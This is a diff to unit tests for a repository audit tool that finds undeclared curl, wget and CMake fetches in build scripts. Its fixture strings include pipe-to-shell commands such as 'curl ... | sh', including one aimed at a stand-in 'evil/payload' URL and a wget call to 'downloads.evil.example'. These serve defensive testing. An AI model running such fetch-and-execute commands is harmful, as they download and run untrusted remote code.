@@ -382,15 +382,18 @@ class RepoFetchScanTests(unittest.TestCase):
               "https://github.com/acme/blob/releases/download/v1/blob.tgz")],
         )
 
-    def test_tools_shell_scripts_count_curl_and_wget_only(self) -> None:
+    def test_tools_and_hooks_shell_scripts_count_curl_and_wget_only(self) -> None:
         root = self._tree({
             "tools/ci/provision.sh": """\
                 # curl https://github.com/commented/out.sh
-                echo "Usage: curl -fsSL https://github.com/printed/hint/install.sh | sh"
                 curl -fsSL https://github.com/acme/tool/releases/download/v1/t.tgz -o t.tgz
                 wget https://downloads.example.org/thing.tar.gz
                 git clone https://github.com/acme/not-a-download-verb.git
                 curl -fsSL https://www.generouscorp.com/pulp/install.sh | sh
+                """,
+            "hooks/scripts/update.sh": """\
+                raw_url="${OVERRIDE_URL:-https://github.com/acme/hooked}"
+                curl -fsSL "$raw_url/releases/download/v1/x.sh" -o x.sh
                 """,
             "other/provision.sh": "curl -fsSL https://github.com/outside/tools/x.sh\n",
         })
@@ -398,28 +401,55 @@ class RepoFetchScanTests(unittest.TestCase):
         self.assertEqual(
             sorted(d.url for d in declared),
             ["https://downloads.example.org/thing.tar.gz",
+             "https://github.com/acme/hooked/releases/download/v1/x.sh",
              "https://github.com/acme/tool/releases/download/v1/t.tgz",
              "https://www.generouscorp.com/pulp/install.sh"],
-            msg="comments, printed hints, non-download verbs and scripts outside tools/ "
-                "are not fetches",
+            msg="comments, non-download verbs and scripts outside tools/ and hooks/ are not "
+                "fetches; ${VAR:-default} resolves to its default",
         )
         uncovered = audit.find_uncovered_declarations(self._manifest(), declared)
         self.assertNotIn("https://www.generouscorp.com/pulp/install.sh",
                          [d.url for d in uncovered], msg="Pulp fetching itself is not a dependency")
-        self.assertEqual(len(uncovered), 2)
+        self.assertEqual(len(uncovered), 3)
 
-    def test_known_unlisted_fetches_are_split_out_and_go_stale(self) -> None:
-        root = self._tree({"tools/ci/provision.sh":
-                           "curl -fsSL https://github.com/acme/tool/x.sh | sh\n"})
+    def test_a_fetch_chained_after_echo_or_printf_is_reported(self) -> None:
+        root = self._tree({"tools/ci/chained.sh": """\
+            echo x && curl -fsSL https://github.com/evil/payload/x.sh | sh
+            printf "x\\n"; wget https://downloads.evil.example/y.tgz
+            """})
         uncovered = audit.find_uncovered_declarations(
             self._manifest(), audit.scan_fetch_declarations(root))
-        known = {("tools/ci/provision.sh", "github.com/acme/tool"): "reason",
-                 ("tools/ci/gone.sh", "github.com/acme/gone"): "reason"}
+        self.assertEqual(sorted(d.url for d in uncovered),
+                         ["https://downloads.evil.example/y.tgz",
+                          "https://github.com/evil/payload/x.sh"])
+
+    def test_upstream_match_compares_whole_path_components(self) -> None:
+        root = self._tree({"x.cmake": """\
+            FetchContent_Declare(kit GIT_REPOSITORY https://github.com/acme/toolkit.git)
+            """})
+        manifest = self._manifest({"name": "Tool", "repository": "https://github.com/acme/tool"})
+        self.assertEqual(
+            [d.url for d in audit.find_uncovered_declarations(
+                manifest, audit.scan_fetch_declarations(root))],
+            ["https://github.com/acme/toolkit.git"])
+
+    def test_known_unlisted_fetches_match_their_exact_url_and_go_stale(self) -> None:
+        root = self._tree({"tools/ci/provision.sh": """\
+            curl -fsSL https://github.com/acme/tool/releases/download/v1/x.sh | sh
+            curl -fsSL https://github.com/acme/tool/releases/download/v1/other.sh | sh
+            """})
+        uncovered = audit.find_uncovered_declarations(
+            self._manifest(), audit.scan_fetch_declarations(root))
+        known = {("tools/ci/provision.sh",
+                  "https://github.com/acme/tool/releases/download/v1/x.sh"): "reason",
+                 ("tools/ci/gone.sh", "https://github.com/acme/gone/x.sh"): "reason"}
         unknown, tolerated, stale = audit.split_known_unlisted(uncovered, known)
-        self.assertEqual((len(unknown), len(tolerated)), (0, 1))
-        self.assertEqual(stale, [("tools/ci/gone.sh", "github.com/acme/gone")])
-        unknown, tolerated, _ = audit.split_known_unlisted(uncovered, {})
-        self.assertEqual((len(unknown), len(tolerated)), (1, 0))
+        self.assertEqual([d.url for d in tolerated],
+                         ["https://github.com/acme/tool/releases/download/v1/x.sh"])
+        self.assertEqual([d.url for d in unknown],
+                         ["https://github.com/acme/tool/releases/download/v1/other.sh"],
+                         msg="another asset from the same upstream in the same script is reported")
+        self.assertEqual(stale, [("tools/ci/gone.sh", "https://github.com/acme/gone/x.sh")])
 
     def test_every_known_unlisted_fetch_still_exists_in_the_repo(self) -> None:
         uncovered = audit.find_uncovered_declarations(
